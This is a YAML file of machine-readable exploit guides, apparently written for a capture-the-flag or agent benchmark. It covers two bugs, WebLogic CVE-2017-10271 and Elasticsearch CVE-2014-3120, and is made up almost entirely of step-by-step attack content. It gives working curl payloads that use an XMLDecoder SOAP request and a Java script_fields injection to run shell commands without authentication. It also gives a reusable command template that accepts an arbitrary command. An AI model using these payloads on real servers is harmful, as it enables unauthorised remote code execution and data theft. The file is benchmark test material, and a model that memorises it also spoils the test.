targets.exploit_guide:
version: 2
cve_id: CVE-2017-10271
summary: Exploits WebLogic WLS-WSAT XMLDecoder RCE via SOAP request to execute a command
  that copies the flag to a web-accessible path, then retrieves it via HTTP.
target:
  protocol: http
  port: 7001
  service_role: middleware
  endpoints:
  - /wls-wsat/CoordinatorPortType
  - /bea_wls_internal/
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 7001
steps:
- id: step-1
  action: Exploit XMLDecoder RCE to copy flag to web-accessible path
  procedure: Send a SOAP request with an XMLDecoder payload to /wls-wsat/CoordinatorPortType.
    The payload uses java.lang.ProcessBuilder to execute a bash command that copies
    /flag to the bea_wls_internal web application directory.
  command_hint: 'curl -s -X POST http://{{target_ip}}:{{target_port}}/wls-wsat/CoordinatorPortType
    -H "Content-Type: text/xml" -d ''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
    xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array
    class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void
    index="1"><string>-c</string></void><void index="2"><string>cat /flag > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/flag.txt</string></void></array><void
    method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'''
  depends_on: []
  success_signal: HTTP 500 response with SOAP fault (NoSuchElementException expected)
    indicating payload processed
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Retrieve the flag file via HTTP
  procedure: Fetch the flag file from the bea_wls_internal web application context
    where it was written in the previous step.
  command_hint: curl -s http://{{target_ip}}:{{target_port}}/bea_wls_internal/flag.txt
  depends_on:
  - step-1
  success_signal: HTTP 200 response containing the flag content
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  - write_file
  command_channel:
    type: none
    established_by: []
    invocation_hint: ''
    reusable: false
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence

version: 2
cve_id: CVE-2014-3120
summary: Exploits Elasticsearch script_fields RCE by creating a dummy document and
  executing Java code via search query to read the flag.
target:
  protocol: http
  port: 9200
  service_role: middleware
  endpoints: []
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 9200
steps:
- id: step-1
  action: Create dummy document
  procedure: Create a document in Elasticsearch to ensure that subsequent search queries
    return at least one hit, which is required for script_fields execution.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/website/blog/''
    -H ''Content-Type: application/json'' -d ''{"name": "test"}'''
  depends_on: []
  success_signal: HTTP response containing JSON with '"created":true' or '"ok":true'
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Execute RCE to read flag
  procedure: Send a search request with a malicious script_fields parameter that uses
    Java Runtime.exec to run 'cat /flag' and return the output in the search results.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/_search?pretty''
    -H ''Content-Type: application/json'' -d ''{"size": 1, "query": {"filtered": {"query":
    {"match_all": {}}}}, "script_fields": {"command": {"script": "import java.io.*;new
    java.util.Scanner(Runtime.getRuntime().exec(\"cat /flag\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'''
  depends_on:
  - step-1
  success_signal: JSON response containing the flag value in the 'fields' -> 'command'
    array
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  command_channel:
    type: http_api
    established_by:
    - step-2
    invocation_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/_search?pretty''
      -H ''Content-Type: application/json'' -d ''{"size": 1, "query": {"filtered":
      {"query": {"match_all": {}}}}, "script_fields": {"command": {"script": "import
      java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"<CMD>\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'''
    reusable: true
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence
